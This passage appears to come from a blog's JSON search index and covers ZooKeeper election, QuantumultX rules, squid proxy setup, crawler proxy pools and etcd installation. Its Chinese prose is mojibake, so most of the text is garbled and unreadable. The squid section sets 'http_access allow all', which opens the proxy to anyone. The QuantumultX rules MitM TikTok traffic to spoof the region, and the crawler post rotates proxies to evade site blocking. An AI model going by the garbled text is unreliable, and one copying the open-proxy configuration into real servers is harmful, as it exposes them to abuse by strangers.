è¾ƒå¤§ï¼Œåˆ™æŠŠè‡ªå·±çš„æŠ•ç¥¨ä¿¡æ¯`æ›´æ–°`ä¸ºåˆ«çš„èŠ‚ç‚¹å‘è¿‡æ¥çš„æŠ•ç¥¨ä¿¡æ¯ï¼Œ**å¦‚æœ ZXID ç›¸ç­‰ï¼Œåˆ™æ¯”è¾ƒ SID**ã€‚è¿™é‡ŒèŠ‚ç‚¹ A å’Œ èŠ‚ç‚¹ B çš„ ZXID ç›¸åŒï¼ŒSID çš„è¯ï¼ŒèŠ‚ç‚¹ B è¦å¤§äº›ï¼Œæ‰€ä»¥èŠ‚ç‚¹ A æ›´æ–°æŠ•ç¥¨ä¿¡æ¯ä¸ºï¼ˆ2ï¼Œ0ï¼‰ï¼Œç„¶åå°†æŠ•ç¥¨ä¿¡æ¯`å†æ¬¡`å‘é€å‡ºå»ã€‚è€ŒèŠ‚ç‚¹ B `ä¸éœ€è¦æ›´æ–°`æŠ•ç¥¨ä¿¡æ¯ï¼Œä½†æ˜¯ä¸‹ä¸€è½®è¿˜éœ€è¦å†æ¬¡å°†æŠ•ç¥¨å‘å‡ºå»ã€‚\n\n### 5.3 é¢†å¯¼è€…æ•…éšœ\n\n- å‰©ä¸‹çš„ Follower è¿›è¡Œé€‰ä¸¾ï¼ŒObserver ä¸å‚ä¸é€‰ä¸¾ã€‚\n- æŠ•ç¥¨ä¿¡æ¯ä¸­çš„ zxid ç”¨çš„æ˜¯æœ¬åœ°ç£ç›˜æ—¥å¿—æ–‡ä»¶ä¸­çš„ã€‚å¦‚æœè¿™ä¸ªèŠ‚ç‚¹ä¸Šçš„ zxid è¾ƒå¤§ï¼Œå°±ä¼šè¢«å½“é€‰ä¸º Leaderã€‚å¦‚æœ Follower çš„ zxid éƒ½ç›¸åŒï¼Œåˆ™ Follower çš„èŠ‚ç‚¹ id è¾ƒå¤§çš„ä¼šè¢«é€‰ä¸º Leaderã€‚\n\n\n\n### 5.4 èŠ‚ç‚¹ä¹‹é—´åŒæ­¥æ•°æ®\n\nè€Œå®¢æˆ·ç«¯å‘é€è¯»å†™è¯·æ±‚æ—¶æ˜¯ä¸çŸ¥é“è‡ªå·±è¿çš„æ˜¯Leader è¿˜æ˜¯ Followerã€‚\n\n**å¦‚æœå®¢æˆ·ç«¯è¿çš„æ˜¯ä¸»èŠ‚ç‚¹**ï¼Œå‘é€äº†å†™è¯·æ±‚ï¼Œé‚£ä¹ˆ Leader æ‰§è¡Œ 2PCï¼ˆä¸¤é˜¶æ®µæäº¤åè®®ï¼‰åŒæ­¥ç»™å…¶ä»– Follower å’Œ Observer å°±å¯ä»¥äº†ã€‚\n\n**å¦‚æœå®¢æˆ·ç«¯è¿çš„æ˜¯ Follower**ï¼Œå‘é€äº†å†™è¯·æ±‚ï¼Œé‚£ä¹ˆ Follower ä¼šå°†å†™è¯·æ±‚è½¬å‘ç»™ Leaderï¼Œç„¶å Leader å†è¿›è¡Œ 2PC åŒæ­¥æ•°æ®ç»™ Followerã€‚\n\n\n\n# 6. å‚è€ƒèµ„æ–™ \n\n+ https://toutiao.io/posts/ax7f2dz/preview\n+ https://pdai.tech/md/algorithm/alg-domain-distribute-overview.html\n+ https://www.bilibili.com/video/BV1TW411M7Fx\n+ http://thesecretlivesofdata.com/raft/\n+ https://raft.github.io/\n","tags":["åˆ†å¸ƒå¼"],"categories":["åˆ†å¸ƒå¼"]},{"title":"QuantumultXç¥å™¨çš„ä½¿ç”¨","url":"%2Fp%2F6f2c88a8.html","content":"\nQuantumult X æ˜¯ç›®å‰ iOS å¹³å°ä¸»æµçš„å…¨èƒ½ç½‘ç»œå·¥å…·ï¼Œæä¾› MitMã€HTTP Debug ä¹ƒè‡³ JS è„šæœ¬ç­‰è¯¸å¤šåŠŸèƒ½ï¼ŒåŒæ—¶ä¿æŒäº†ç›¸å½“é«˜çš„æ˜“ç”¨æ€§ã€‚ \n\nè¿™æ˜¯ä¸€ä¸ªä»˜è´¹è½¯ä»¶ï¼Œéœ€è¦åœ¨ App Store è¿›è¡Œè´­ä¹°æ‰èƒ½ä½¿ç”¨ã€‚\n\n<!-- more -->\n\n# 1. é…ç½®\n\n### 1.1  é¢„é…ç½®\n\nhttps://github.com/Orz-3/QuantumultX\n\nå…ˆä¸‹è½½é¢„é…ç½®åï¼Œå†å¯¼å…¥è‡ªå·±çš„èŠ‚ç‚¹ã€‚\n\n### 1.2 icon åº“\n\nhttps://github.com/Koolson/Qure\n\nå»ºè®®ç›´æ¥å¯¼å…¥jsonã€‚\n\n### 1.3 è®¢é˜…è½¬æ¢\n\né­…å½±æé€Ÿæœºåœºå®˜æ–¹è®¢é˜…è½¬æ¢ã€‚\n\nhttps://api.nameless13.com/\n\næ—©æœŸæ˜¯Dler Cloud æœºåœºå®˜æ–¹çš„è®¢é˜…è½¬æ¢ç½‘ç«™ï¼Œåæ¥ç‹¬ç«‹å‡ºæ¥äº†ã€‚ç°åœ¨åº”è¯¥æ˜¯å’Œ Dler æ— å…³ã€‚\n\nhttps://sub.dler.io/\n\næ›´åŠ å¼ºå¤§çš„è½¬æ¢\n\nhttps://sub.v1.mk/\n\n\n\n### 1.4 è‡ªåŠ¨æ£€æµ‹æŒ‡å®šæœºåœºç­–ç•¥\n\n```ini\n[policy]\nurl-latency-benchmark=ä¸å€¼é’±èŠ‚ç‚¹, resource-tag-regex=^(?!.*Amy), check-interval=300, tolerance=0, alive-checking=false, img-url=https://raw.githubusercontent.com/Koolson/Qure/master/IconSet/Color/Media.png\n```\n\n\n\n# 2. åŠŸèƒ½\n\n### 2.1 ç½‘æ˜“äº‘\n\næ³¨æ„Quanxå¹¶ä¸èƒ½ç›´æ¥è§£é”ç½‘æ˜“äº‘ï¼Œè¿˜æ˜¯éœ€è¦æ­å»ºä»£ç†è½¬å‘æœåŠ¡å™¨çš„ã€‚å‚è§ï¼šhttps://www.liuvv.com/p/3a9129d9.html\n\na. ä¸‹è½½è¯ä¹¦\n\nhttps://raw.githubusercontent.com/UnblockNeteaseMusic/server/enhanced/ca.crt\n\nb. é…ç½®ï¼Œ httpå¤„æ˜¯è‡ªå·±çš„æœåŠ¡å™¨åœ°å€\n\n```ini\n[server_local]\nhttp=152.136.138.232:8080, fast-open=false, udp-relay=false, tag=ğŸ§ è§£é”ç½‘æ˜“äº‘éŸ³ä¹\n\n\n[policy]\nstatic=è§£é”ç½‘æ˜“äº‘éŸ³ä¹, direct, proxy, ğŸ§ è§£é”ç½‘æ˜“äº‘éŸ³ä¹, img-url=https://raw.githubusercontent.com/Koolson/Qure/master/IconSet/Color/Netease_Music_Unlock.png\n\n[filter_remote]\nhttps://raw.githubusercontent.com/GeQ1an/Rules/master/QuantumultX/Filter/Optional/Netease%20Music.list, tag=è§£é”ç½‘æ˜“äº‘éŸ³ä¹, force-policy=è§£é”ç½‘æ˜“äº‘éŸ³ä¹, update-interval=172800, opt-parser=false, enabled=true\n```\n\n\n\n### 2.2 Tiktok\n\na. æ³¨æ„  TikTok Version 21.1.0 ï¼Œæœ€å¥½ä¸è¦å‡çº§\n\nb. é…ç½®\n\n```ini\n[rewrite_local]\n(?<=_region=)CN(?=&) url 307 KR\n(?<=&mcc_mnc=)4 url 307 2\n^(https?:\\/\\/(tnc|dm)[\\w-]+\\.\\w+\\.com\\/.+)(\\?)(.+) url 302  $1$3\n(?<=\\d\\/\\?\\w{7}_\\w{4}=)1[6-9]..(?=.?.?&) url 307 17\n\n[mitm]\nhostname = *.tiktokv.com, *.byteoversea.com, *.tik-tokapi.com\n\n[filter_remote]\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Quantumult-X/TikTok.list, tag=TikTok, force-policy=TikTok, update-interval=86400, opt-parser=false, enabled=true\n\n```\n\nc. æ¢åŒº\n\næ¢åŒºï¼šåœ¨[rewrite_local]ä¸­æ·»åŠ ä¸‹å¥é‡å†™ï¼Œå¹¶å°†`CN`æ”¹ä¸ºæƒ³çœ‹çš„å›½å®¶/åœ°åŒºçš„2ä½`å¤§å†™`è‹±æ–‡ç®€å†™ JPï¼ˆæ—¥æœ¬ï¼‰ï½œKRï¼ˆéŸ©å›½ï¼‰ï½œUKï¼ˆè‹±å›½ï¼‰ï½œUSï¼ˆç¾å›½ï¼‰ï½œTWï¼ˆå°æ¹¾ï¼‰\n\n```ini\n(?<=_region=)CN(?=&) url 307 CN\n```\n\n\n\n# 3. è„šæœ¬\n\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://uzbox.com/tech/quanx.html\n+ https://www.notion.so/Quantumult-X-1d32ddc6e61c4892ad2ec5ea47f00917","tags":["iOS"],"categories":["è½¯ä»¶"]},{"title":"squidä»£ç†ä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2F94837db0.html","content":"\nçˆ¬è™«ç©å¾—å¥½ï¼Œç‰¢é¥­åƒåˆ°é¥±ã€‚\n\nç›®å‰å…è´¹çš„ä»£ç†æ± å‡ ä¹ä¸èƒ½ç”¨, ç¨³å®šçš„ä»£ç†æ± æ”¶è´¹åˆæ¯”è¾ƒé«˜ã€‚è¶ç€åŒåä¸€æ’¸äº†å‡ å°ä¾¿å®œçš„äº‘æœåŠ¡å™¨, ç›´æ¥æ‹¿æ¥å½“ä»£ç†æœåŠ¡å™¨ä½¿ç”¨äº†ã€‚\n\nsquidæœåŠ¡ç¨‹åºæ˜¯ä¸€æ¬¾åœ¨Unixç³»ç»Ÿä¸­æœ€ä¸ºæµè¡Œçš„é«˜æ€§èƒ½ä»£ç†æœåŠ¡è½¯ä»¶ï¼Œé€šå¸¸ä¼šè¢«å½“ä½œç½‘ç«™çš„å‰ç½®ç¼“å­˜æœåŠ¡ï¼Œç”¨äºæ›¿ä»£ç”¨æˆ·å‘ç½‘ç«™æœåŠ¡å™¨è¯·æ±‚é¡µé¢æ•°æ®å¹¶è¿›è¡Œç¼“å­˜ï¼Œé€šä¿—æ¥è®²ï¼ŒsquidæœåŠ¡ç¨‹åºä¼šæ¥æ”¶ç”¨æˆ·çš„è¯·æ±‚ï¼Œç„¶åè‡ªåŠ¨å»ä¸‹è½½åˆ¶å®šæ•°æ®(å¦‚ç½‘é¡µ)å¹¶å­˜å‚¨åœ¨æœåŠ¡å™¨å†…ï¼Œå½“ä»¥åçš„ç”¨æˆ·å†æ¥è¯·æ±‚ç›¸åŒæ•°æ®æ—¶ï¼Œåˆ™ç›´æ¥å°†åˆšåˆšå­˜å‚¨åœ¨æœåŠ¡å™¨æœ¬åœ°çš„æ•°æ®äº¤ç»™ç”¨æˆ·ï¼Œè¾ƒå°‘ç”¨æˆ·çš„ç­‰å¾…æ—¶é—´ã€‚\n\n<!-- more -->\n\n# 1. squidä»£ç†åˆ†ç±»\n\n### 1.1 æ­£å‘ä»£ç†\n\næ­£å‘ä»£ç†è®©ç”¨æˆ·å¯ä»¥é€šè¿‡SquidæœåŠ¡ç¨‹åºè·å–ç½‘ç«™é¡µé¢çš„æ•°æ®ï¼Œå…·ä½“å·¥ä½œå½¢å¼åˆ†ä¸ºæ ‡å‡†ä»£ç†æ¨¡å¼ä¸é€æ˜ä»£ç†æ¨¡å¼ã€‚\n\n+ æ ‡å‡†æ­£å‘ä»£ç†æ¨¡å¼ï¼š\n\n  ç”¨æˆ·è®¿é—®ç½‘ç«™ï¼Œå…ˆåˆ°squidä»£ç†æœåŠ¡å™¨ï¼Œå¦‚æœsquidä»£ç†æœåŠ¡å™¨æœ‰æ•°æ®ï¼Œé‚£ä¹ˆsquidå°±ç›´æ¥ä»ç¼“å­˜ä¸­æ”¾å›ç»™ç”¨æˆ·ï¼Œå¦‚æœsquidç¼“å­˜ä¸­æ²¡æœ‰ï¼Œé‚£ä¹ˆsquidå°±ä»£æ›¿ç”¨æˆ·å»è®¿é—®ç½‘ç«™ï¼ŒæŠŠæ•°æ®è¿”å›çš„ç»™ç”¨æˆ·çš„åŒæ—¶ç•™ä¸€ä»½åˆ°ç¼“å­˜ä¸­ï¼Œä¸€éä¸‹æ¬¡ç”¨æˆ·ï¼ˆæˆ–è€…å…¶ä»–ç”¨æˆ·ï¼‰è®¿é—®çš„æ—¶å€™ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­è¿”å›ç»™ç”¨æˆ·\n\n  \n\n+ é€æ˜æ­£å‘ä»£ç†æ¨¡å¼ï¼š\n\n  é€æ˜ä»£ç†ç¼“å†²æœåŠ¡å™¨å’Œæ ‡å‡†ä»£ç†æœåŠ¡å™¨çš„åŠŸèƒ½å®Œå…¨ç›¸åŒã€‚ç›¸å¯¹äºæ™®é€šä»£ç†æœåŠ¡è€Œè¨€ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦åšä»»ä½•å’Œä»£ç†æœåŠ¡å™¨ç›¸å…³çš„è®¾ç½®ï¼Œå¯¹ç”¨æˆ·è€Œè¨€ï¼Œæ„Ÿè§‰ä¸åˆ°ä»£ç†æœåŠ¡å™¨çš„å­˜åœ¨ï¼Œæ‰€ä»¥ç§°ä¹‹ä¸ºé€æ˜ä»£ç†ã€‚\n\n  å³æŠŠä»£ç†æœåŠ¡å™¨éƒ¨ç½²åœ¨æ ¸å¿ƒçš„ä¸Šç½‘å‡ºå£ï¼Œå½“ç”¨æˆ·ä¸Šç½‘æµè§ˆé¡µé¢æ—¶ï¼Œä¼šäº¤ç»™ä»£ç†æœåŠ¡å™¨å‘å¤–è¯·æ±‚ï¼Œå¦‚æœç»“åˆiptableså¯ä»¥å®ç°ä»£ç†+ç½‘å…³+å†…å®¹è¿‡æ»¤+æµé‡å®‰å…¨æ§åˆ¶ç­‰å®Œæ•´çš„ä¸Šç½‘è§£å†³æ–¹æ¡ˆã€‚\n\n  \n\n### 1.2 åå‘ä»£ç†\n\nåå‘ä»£ç†æ˜¯æŒ‡ä»¥ä»£ç†æœåŠ¡å™¨æ¥æ¥å—internetä¸Šçš„è¿æ¥è¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»å†…éƒ¨æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™internetä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ä»£ç†æœåŠ¡å™¨å¯¹å¤–è¡¨ç°ä¸ºä¸€ä¸ªæœåŠ¡å™¨ã€‚\n\nsquidåšåå‘ä»£ç†æœåŠ¡å™¨ï¼Œé€šå¸¸å·¥ä½œåœ¨ä¸€ä¸ªæœåŠ¡å™¨é›†ç¾¤çš„å‰ç«¯ï¼Œåœ¨ç”¨æˆ·çœ‹æ¥ï¼ŒsquidæœåŠ¡å™¨å°±æ˜¯ä»–æ‰€è¦è®¿é—®çš„æœåŠ¡å™¨ï¼Œè€Œå®é™…æ„ä¹‰ä¸Šï¼Œsquidåªæ˜¯æ¥å—ç”¨æˆ·çš„è¯·æ±‚ï¼ŒåŒæ—¶å°†ç”¨æˆ·è¯·æ±‚è½¬å‘ç»™å†…éƒ¨çœŸæ­£çš„WEBæœåŠ¡å™¨ï¼Œå¦‚æœsquidæœ¬èº«æœ‰ç”¨æˆ·è¦è®¿é—®çš„å†…å®¹ï¼Œåˆ™squidç›´æ¥å°†æ•°æ®è¿”å›ç»™ç”¨æˆ·ï¼Œèµ·åˆ°äº†ç¼“å­˜æ•°æ®çš„ä½œç”¨ï¼Œå‡å°‘äº†åç«¯æœåŠ¡å™¨çš„å‹åŠ›ã€‚\n\n\n\n### 1.3 åŒºåˆ«\n\n+ æ¦‚å¿µ\n\n  æ­£å‘ä»£ç†ï¼šå¯¹äºåŸå§‹æœåŠ¡å™¨è€Œè¨€ï¼Œå°±æ˜¯å®¢æˆ·ç«¯çš„ä»£è¨€äºº\n\n  åå‘ä»£ç†ï¼šå¯¹äºå®¢æˆ·ç«¯è€Œè¨€ï¼Œå°±åƒæ˜¯åŸå§‹æœåŠ¡å™¨\n\n+ ç”¨é€”\n\n  æ­£å‘ä»£ç†çš„å…¸å‹ç”¨é€”æ˜¯ä¸ºåœ¨é˜²ç«å¢™å†…çš„å±€åŸŸç½‘å®¢æˆ·ç«¯æä¾›è®¿é—®Internetçš„é€”å¾„ã€‚æ­£å‘ä»£ç†è¿˜å¯ä»¥ä½¿ç”¨ç¼“å†²ç‰¹æ€§å‡å°‘ç½‘ç»œä½¿ç”¨ç‡ã€‚\n\n  åå‘ä»£ç†è¿˜å¯ä»¥ä¸ºåç«¯çš„å¤šå°æœåŠ¡å™¨æä¾›è´Ÿè½½å¹³è¡¡ï¼Œæˆ–ä¸ºåç«¯è¾ƒæ…¢çš„æœåŠ¡å™¨æä¾›ç¼“å†²æœåŠ¡ã€‚å¦å¤–ï¼Œåå‘ä»£ç†è¿˜å¯ä»¥å¯ç”¨é«˜çº§URLç­–ç•¥å’Œç®¡ç†æŠ€æœ¯ï¼Œä»è€Œä½¿å¤„äºä¸åŒwebæœåŠ¡å™¨ç³»ç»Ÿçš„webé¡µé¢åŒæ—¶å­˜åœ¨äºåŒä¸€ä¸ªURLç©ºé—´ä¸‹ã€‚\n\n+ å®‰å…¨æ€§\n\n  æ­£å‘ä»£ç†å…è®¸å®¢æˆ·ç«¯é€šè¿‡å®ƒè®¿é—®ä»»æ„ç½‘ç«™å¹¶ä¸”éšè—å®¢æˆ·ç«¯è‡ªèº«ï¼Œå› æ­¤ä½ å¿…é¡»é‡‡å–å®‰å…¨æªæ–½ä»¥ç¡®ä¿ä»…ä¸ºç»è¿‡æˆæƒçš„å®¢æˆ·ç«¯æä¾›æœåŠ¡ã€‚\n\n  åå‘ä»£ç†å¯¹å¤–éƒ½æ˜¯é€æ˜çš„ï¼Œè®¿é—®è€…å¹¶ä¸çŸ¥é“è‡ªå·±è®¿é—®çš„æ˜¯ä¸€ä¸ªä»£ç†ã€‚\n\n  \n\n# 2. å®‰è£…ä½¿ç”¨\n\n```bash\napt update\napt install -y squid\n```\n\n\n\n### 2.1 ä¿®æ”¹é…ç½®\n\n```bash\nvi /etc/squid/squid.conf\n\n# ä»£ç†æœåŠ¡å™¨ç«¯å£\nhttp_port 3128\n\n\n# ä¿®æ”¹é»˜è®¤å…è®¸ç­–ç•¥, æŠŠ deny æ¢æˆ allow\nhttp_access deny all\nhttp_access allow all\n```\n\nä¿®æ”¹å®Œé…ç½®ä»¥åé‡å¯: `systemctl restart squid`\n\n\n\n### 2.2 log é…ç½®\n\nsquidçš„æ—¥å¿—ä½äº/var/log/squid/ç›®å½•ä¸‹ã€‚\n\n```bash\ntail -f /var/log/squid/access.log\n```\n\nå¦‚æœæƒ³åœ¨logä¸ŠåŠ ä¸Šæ—¥æœŸ: \n\n```ini\nlogformat combined %>a %ui %un [%tl] \"%rm %ru HTTP/%rv\" %Hs %<st \"%{Referer}>h\" \"%{User-Agent}>h\" %Ss:%Sh %{host}>h\naccess_log daemon:/var/log/squid/access.log combined\n```\n\n\n\n### 2.3 å…è®¸ç‰¹å®š ip\n\nå…ˆå¢åŠ ä¸€ä¸ªè§„åˆ™, ç„¶åå…è®¸\n\n```ini\nacl specialIP src x.x.x.x\nhttp_access allow specialIP\n\n# ä¾‹å­\nacl papa src 1.1.1.1\nhttp_access allow papa\n```\n\n\n\n# 3. æ³¨æ„äº‹é¡¹\n\n### 3.1 æµè§ˆå™¨è®¾ç½®ä»£ç†è®¿é—®\n\nTODO:\n\n### 3.2 æµ‹è¯•demo\n\nå¦‚æœæ— æ³•è®¿é—®, è¯·æ£€æŸ¥æ˜¯å¦å¼€å¯é˜²ç«å¢™ç«¯å£\n\n```go\npackage main\n\nimport (\n   \"fmt\"\n   \"io/ioutil\"\n   \"log\"\n   \"net/http\"\n   \"net/url\"\n   \"time\"\n)\n\nfunc main() {\n  proxy, err := url.Parse(\"http://ä»£ç†ip:ä»£ç†ç«¯å£\")\n   if err != nil {\n      log.Fatal(err)\n   }\n\n   httpClient := &http.Client{\n      Timeout: time.Second * 10,\n      Transport: &http.Transport{\n         Proxy: http.ProxyURL(proxy),\n      },\n   }\n\n   res, err := httpClient.Get(\"https://www.baidu.com\")\n   if err != nil {\n      log.Println(err)\n      return\n   }\n   defer res.Body.Close()\n   if res.StatusCode != http.StatusOK {\n      log.Println(err)\n      return\n   }\n   c, _ := ioutil.ReadAll(res.Body)\n   fmt.Println(string(c))\n}\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ http://blog.haoji.me/linux-squid-proxy.html\n+ https://www.cnblogs.com/bluestorm/p/9032086.html","tags":["squid"],"categories":["çˆ¬è™«"]},{"title":"çˆ¬è™«IPä»£ç†æ± ","url":"%2Fp%2F3020e4ad.html","content":"\n\n\nå¯¹äºçˆ¬è™«æ¥è¯´ï¼Œç”±äºçˆ¬è™«çˆ¬å–é€Ÿåº¦è¿‡å¿«ï¼Œåœ¨çˆ¬å–è¿‡ç¨‹ä¸­å¯èƒ½é‡åˆ°åŒä¸€ä¸ªIPè®¿é—®è¿‡äºé¢‘ç¹çš„é—®é¢˜ï¼Œæ­¤æ—¶ç½‘ç«™å°±ä¼šè®©æˆ‘ä»¬è¾“å…¥éªŒè¯ç ç™»å½•æˆ–è€…ç›´æ¥å°é”IPï¼Œè¿™æ ·ä¼šç»™çˆ¬å–å¸¦æ¥æå¤§çš„ä¸ä¾¿ã€‚\n\nä½¿ç”¨ä»£ç†éšè—çœŸå®çš„IPï¼Œè®©æœåŠ¡å™¨è¯¯ä»¥ä¸ºæ˜¯ä»£ç†æœåŠ¡å™¨åœ¨è¯·æ±‚è‡ªå·±ã€‚è¿™æ ·åœ¨çˆ¬å–è¿‡ç¨‹ä¸­é€šè¿‡ä¸æ–­æ›´æ¢ä»£ç†ï¼Œå°±ä¸ä¼šè¢«å°é”ï¼Œå¯ä»¥è¾¾åˆ°å¾ˆå¥½çš„çˆ¬å–æ•ˆæœã€‚\n\n<!-- more -->\n\n\n\n# 1. å…è´¹ä»£ç†\n\nå…è´¹ä»£ç†å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ˜¯ä¸å¥½ç”¨çš„ï¼Œæ‰€ä»¥æ¯”è¾ƒé è°±çš„æ–¹æ³•æ˜¯è´­ä¹°ä»˜è´¹ä»£ç†ã€‚\n\n### 1.1 å¼€æºé¡¹ç›® proxy_pool\n\n##### 1.1.1 å®‰è£…å’Œå¯åŠ¨\n\n```Â bash\ndocker pull jhao104/proxy_pool\n\n#ä¾èµ–redis, æ‰€ä»¥è¦å…ˆå®‰è£… redis\ndocker run -d --name redis -p 6379:6379 redis:latest  --requirepass \"123456\"\ndocker run --env DB_CONN=redis://:123456@172.17.0.1:6379/1 -p 5010:5010 --name proxy_pool jhao104/proxy_pool:latest\n```\n\n\n\n#### 1.1.2 ä½¿ç”¨\n\ndocker å¯åŠ¨å, é€šè¿‡è®¿é—®æœ¬åœ°çš„æ¥å£, å°±å¯ä»¥å¾—åˆ° ip\n\n```\nhttp://127.0.0.1:5010/get/\n```\n\næˆ–è€…ç”¨ä½œè€…ç»™å‡ºçš„æµ‹è¯•åœ°å€: http://118.24.52.95/get/\n\n\n\n\n# 2. ä»˜è´¹ä»£ç†\n\n### 2.1 èŠéº»ä»£ç†\n\n+ http://h.zhimaruanjian.com/getapi/\n\n+ ç”Ÿæˆ API é“¾æ¥\n\n+ è°ƒç”¨ API è·å– IP å’Œç«¯å£(å¦‚æœæç¤ºåŠ å…¥ç™½åå•, ç”¨æ–‡æ¡£é‡Œçš„æ¥å£å³å¯)\n\n  \n\n# 3. ä»£ç \n\n### 3.1 golang \n\n```go\npackage main\n\nimport (\n   \"fmt\"\n   \"io/ioutil\"\n   \"log\"\n   \"net/http\"\n   \"net/url\"\n   \"time\"\n)\n\nfunc main() {\n\n  proxy, err := url.Parse(\"http://ä»£ç†ip:ä»£ç†ç«¯å£\")\n   if err != nil {\n      log.Fatal(err)\n   }\n\n   httpClient := &http.Client{\n      Timeout: time.Second * 10,\n      Transport: &http.Transport{\n         Proxy: http.ProxyURL(proxy),\n      },\n   }\n\n   res, err := httpClient.Get(\"https://www.baidu.com\")\n   if err != nil {\n      log.Println(err)\n      return\n   }\n   defer res.Body.Close()\n   if res.StatusCode != http.StatusOK {\n      log.Println(err)\n      return\n   }\n   c, _ := ioutil.ReadAll(res.Body)\n   fmt.Println(string(c))\n}\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://cuiqingcai.com/5491.html\n+ https://github.com/jhao104/proxy_pool\n+ http://www.zhimaruanjian.com/","tags":["çˆ¬è™«"],"categories":["çˆ¬è™«"]},{"title":"etcdçš„åŸç†ä¸golangå®æˆ˜","url":"%2Fp%2Fc0b47ece.html","content":"\n\n\n# 1. etcd ä»‹ç»\n\n[etcd](https://etcd.io/)æ˜¯ä½¿ç”¨Goè¯­è¨€å¼€å‘çš„ä¸€ä¸ªå¼€æºçš„ã€é«˜å¯ç”¨çš„åˆ†å¸ƒå¼key-valueå­˜å‚¨ç³»ç»Ÿï¼Œå¯ä»¥ç”¨äºé…ç½®å…±äº«å’ŒæœåŠ¡çš„æ³¨å†Œå’Œå‘ç°ã€‚ç±»ä¼¼é¡¹ç›®æœ‰zookeeperå’Œconsulã€‚\n\netcdå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š\n\n- å®Œå…¨å¤åˆ¶ï¼šé›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½å¯ä»¥ä½¿ç”¨å®Œæ•´çš„å­˜æ¡£\n- é«˜å¯ç”¨æ€§ï¼šEtcdå¯ç”¨äºé¿å…ç¡¬ä»¶çš„å•ç‚¹æ•…éšœæˆ–ç½‘ç»œé—®é¢˜\n- ä¸€è‡´æ€§ï¼šæ¯æ¬¡è¯»å–éƒ½ä¼šè¿”å›è·¨å¤šä¸»æœºçš„æœ€æ–°å†™å…¥\n- ç®€å•ï¼šåŒ…æ‹¬ä¸€ä¸ªå®šä¹‰è‰¯å¥½ã€é¢å‘ç”¨æˆ·çš„APIï¼ˆgRPCï¼‰\n- å®‰å…¨ï¼šå®ç°äº†å¸¦æœ‰å¯é€‰çš„å®¢æˆ·ç«¯è¯ä¹¦èº«ä»½éªŒè¯çš„è‡ªåŠ¨åŒ–TLS\n- å¿«é€Ÿï¼šæ¯ç§’10000æ¬¡å†™å…¥çš„åŸºå‡†é€Ÿåº¦\n- å¯é ï¼šä½¿ç”¨Raftç®—æ³•å®ç°äº†å¼ºä¸€è‡´ã€é«˜å¯ç”¨çš„æœåŠ¡å­˜å‚¨ç›®å½•\n\n<!-- more -->\n\n# 2. etcd å®‰è£…å’Œä½¿ç”¨\n\n### 2.1 ä¸‹è½½å®‰è£…\n\nhttps://github.com/etcd-io/etcd/releases\n\n```bash\nETCD_VER=v3.4.13\n\n# choose either URL\nGOOGLE_URL=https://storage.googleapis.com/etcd\nGITHUB_URL=https://github.com/etcd-io/etcd/releases/download\nDOWNLOAD_URL=${GOOGLE_URL}\n\nrm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\nrm -rf /tmp/etcd-download-test && mkdir -p /tmp/etcd-download-test\n\ncurl -L ${DOWNLOAD_URL}/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz -o /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\ntar xzvf /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz -C /tmp/etcd-download-test --strip-components=1\nrm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\n\n/tmp/etcd-download-test/etcd --version\n/tmp/etcd-download-test/etcdctl version\n```\n\n\n\n### 2.2 å¯åŠ¨\n\nä¸ºäº†æ–¹ä¾¿, ç§»åŠ¨åˆ°ç¯å¢ƒå˜é‡ä¸‹\n\n```bash\nmv /tmp/etcd-download-test/etcd /usr/local/bin/\nmv /tmp/etcd-download-test/etcdctl /usr/local/bin/\n```\n\n+ å¯åŠ¨\n\n```bash\netcd\n\nnohup etcd --listen-client-urls http://0.0.0.0:2379 --advertise-client-urls http://0.0.0.0:2379 &\n```\n\n+ etcd TCP ports\n\nThe [official etcd ports](http://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.txt) å¯¹äºå®¢æˆ·ç«¯è¯·æ±‚æ˜¯2379ï¼Œå³curl set get æ—¶ç”¨çš„ç«¯å£ã€‚èŠ‚ç‚¹é—´é€šä¿¡ç«¯å£æ˜¯2380ã€‚\n\n\n\n### 2.3 æ“ä½œ\n\n```bash\netcdctl put mykey \"this is awesome\"\n#OK\n\netcdctl get mykey\n#mykey\n#this is awesome\n\netcdctl del mykey\n#1\n\netcdctl get mykey\n#\n\n\n# è·å–æ‰€æœ‰çš„é”®å€¼\netcdctl get / --prefix --keys-only\netcdctl get \"\" --prefix --keys-only | sed '/^\\s*$/d'\n```\n\n\n\n### 2.4 é›†ç¾¤\n\n```\netcd --config-file etcd.conf\n```\n\netcd1.conf\n\n```bash\nname: etcd-1\ndata-dir: /data/server/etcd/data\nlisten-client-urls: http://172.21.0.17:2379,http://127.0.0.1:2379\nadvertise-client-urls: http://172.21.0.17:2379,http://127.0.0.1:2379\nlisten-peer-urls: http://172.21.0.17:2380 # ç›‘å¬çš„\ninitial-advertise-peer-urls: http://172.21.0.17:2380\ninitial-cluster: etcd-1=http://172.21.0.17:2380,etcd-2=http://172.21.0.17:2390,etcd-3=http://172.21.0.15:2380\ninitial-cluster-token: etcd-cluster-token\ninitial-cluster-state: new\n```\n\netcd2.conf\n\n```bash\nname: etcd-2\ndata-dir: /data/server/etcd2/data\nlisten-client-urls: http://172.21.0.17:2389,http://127.0.0.1:2389\nadvertise-client-urls: http://172.21.0.17:2389,http://127.0.0.1:2389\nlisten-peer-urls: 